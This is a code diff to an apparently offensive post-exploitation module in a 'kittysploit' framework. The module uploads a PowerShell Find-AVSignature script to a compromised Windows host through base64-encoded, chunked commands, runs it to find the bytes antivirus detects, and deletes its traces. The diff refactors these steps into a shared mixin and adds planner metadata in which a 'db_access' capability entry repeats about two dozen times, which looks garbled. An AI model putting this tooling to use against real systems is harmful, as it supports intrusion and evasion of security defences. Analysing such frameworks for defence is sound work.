@@ -2,10 +2,12 @@
 # -*- coding: utf-8 -*-
 
 from kittysploit import *
-import base64
 import re
 
-class Module(Post):
+from lib.post.windows.session import WindowsSessionMixin
+
+
+class Module(Post, WindowsSessionMixin):
     _DEFAULT_BUFFER_LEN = 65536
     _DEFAULT_FORCE = True
     _AUTO_CLEANUP = True
@@ -30,6 +32,51 @@ class Module(Post):
         'reversible': False,
         'approval_required': True,
         'produces': ['risk_signals'],
+        'cost': 1.5,
+        'noise': 0.5,
+        'value': 1.0,
+        'requires':         {'min_endpoints': 0,
+         'min_params': 0,
+         'tech_hints_any': [],
+         'tech_hints_all': [],
+         'specializations_any': [],
+         'risk_signals_any': [],
+         'auth_session': False,
+         'capabilities_any': [],
+         'capabilities_all': [],
+         'confidence_min': {},
+         'confidence_min_any': {},
+         'endpoint_pattern_any': [],
+         'param_any': [],
+         'api_surface_ready': False},
+        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 's7comm', 'from_detail': ''},
+                                   {'capability': 'ot_assets', 'from_detail': ''},
+                                   {'capability': 'ot_assets', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''}],
+         'consumes_capabilities': [],
+         'option_bindings': {},
+         'suggested_followups': []},
     },
     }
 
@@ -161,47 +208,6 @@ function Find-AVSignature
 }
 """
 
-    def _execute_cmd(self, command: str) -> str:
-        if not command:
-            return ""
-        output = self.cmd_execute(command)
-        return output.strip() if output else ""
-
-    def _encode_powershell(self, script: str) -> str:
-        return base64.b64encode(script.encode("utf-16le")).decode("ascii")
-
-    def _run_powershell(self, script: str) -> str:
-        encoded = self._encode_powershell(script)
-        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")
-
-    def _remote_temp_dir(self) -> str:
-        output = self._execute_cmd("echo %TEMP%")
-        if output:
-            return output.splitlines()[0].strip().rstrip("\\")
-        return "C:\\Windows\\Temp"
-
-    def _ps_single_quote(self, value: str) -> str:
-        return str(value).replace("'", "''")
-
-    def _write_remote_script(self, temp_dir: str):
-        script_path = f"{temp_dir}\\find_av_signature.ps1"
-        blob_path = f"{temp_dir}\\find_av_signature.b64"
-        payload = base64.b64encode(self._powershell_script().encode("utf-8")).decode("ascii")
-        chunks = [payload[i:i + 3500] for i in range(0, len(payload), 3500)]
-
-        for index, chunk in enumerate(chunks):
-            method = "WriteAllText" if index == 0 else "AppendAllText"
-            ps = f"[IO.File]::{method}('{blob_path}','{chunk}');"
-            self._run_powershell(ps)
-
-        decode_script = (
-            f"$b=[IO.File]::ReadAllText('{blob_path}');"
-            f"[IO.File]::WriteAllText('{script_path}',"
-            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)));"
-        )
-        self._run_powershell(decode_script)
-        return script_path, blob_path
-
     def _validate_options(self):
         if self.start_byte < 0:
             raise ProcedureError(FailureType.ConfigurationError, "start_byte must be >= 0")
@@ -210,31 +216,29 @@ function Find-AVSignature
         if not str(self.target_path or "").strip():
             raise ProcedureError(FailureType.ConfigurationError, "target_path is required")
 
-    def _cleanup_remote(self, paths):
-        for path in paths:
-            self._execute_cmd(f'del /f /q "{path}"')
-
     def check(self):
-        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
-        if "1" not in ps_check:
-            print_error("PowerShell is not available on the target")
-            return False
-        return True
+        return self.win_require_powershell()
 
     def run(self):
         self._validate_options()
+        if not self.check():
+            return False
 
-        temp_dir = self._remote_temp_dir()
+        temp_dir = self.win_remote_temp_dir()
         print_status("Uploading Find-AVSignature payload...")
-        script_path, blob_path = self._write_remote_script(temp_dir)
+        script_path, blob_path = self.win_write_remote_script(
+            self._powershell_script(),
+            temp_dir,
+            "find_av_signature",
+        )
 
         end_value = str(self.end_byte).strip() if str(self.end_byte).strip() else "max"
-        remote_target = self._ps_single_quote(str(self.target_path).strip())
-        remote_end = self._ps_single_quote(end_value)
+        remote_target = self.win_ps_single_quote(str(self.target_path).strip())
+        remote_end = self.win_ps_single_quote(end_value)
 
         invoke = (
             "$ErrorActionPreference='Stop';"
-            f". '{self._ps_single_quote(script_path)}';"
+            f". '{self.win_ps_single_quote(script_path)}';"
             "Find-AVSignature "
             f"-StartByte {int(self.start_byte)} "
             f"-EndByte '{remote_end}' "
@@ -246,10 +250,10 @@ function Find-AVSignature
         )
 
         print_status("Running Find-AVSignature on target...")
-        result = self._run_powershell(invoke)
+        result = self.win_run_powershell(invoke, timeout=120)
 
         if self._AUTO_CLEANUP:
-            self._cleanup_remote([script_path, blob_path])
+            self.win_delete_remote([script_path, blob_path])
 
         if not result:
             raise ProcedureError(FailureType.Unknown, "No output was returned by Find-AVSignature")
